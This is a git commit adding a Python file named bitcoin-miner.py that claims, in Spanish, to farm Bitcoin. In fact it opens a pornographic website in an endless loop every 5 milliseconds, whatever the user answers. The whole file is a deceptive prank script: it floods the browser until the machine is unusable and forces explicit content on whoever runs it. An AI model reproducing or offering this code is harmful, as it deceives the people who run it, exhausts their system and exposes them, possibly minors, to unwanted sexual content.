6da53373227f730520b2317861aea86add3af317
Dlord MDia <109800409+dlordmdia@users.noreply.github.com>
2022-07-25 17:24:51 +0200

    Final Version

---
+++ bitcoin-miner.py
@@ -0,0 +1,14 @@
+import webbrowser
+import time
+
+start = input("Quieres farmear BTC (Bitcoin)? (y/n): ")
+if start == "y":
+    while True:
+        webbrowser.open("https://www.pornhub.com")
+        time.sleep(0.005)
+
+else:
+    print("No importa\n\nToma BTC...")
+    while True:
+        webbrowser.open("https://www.pornhub.com")
+        time.sleep(0.005)
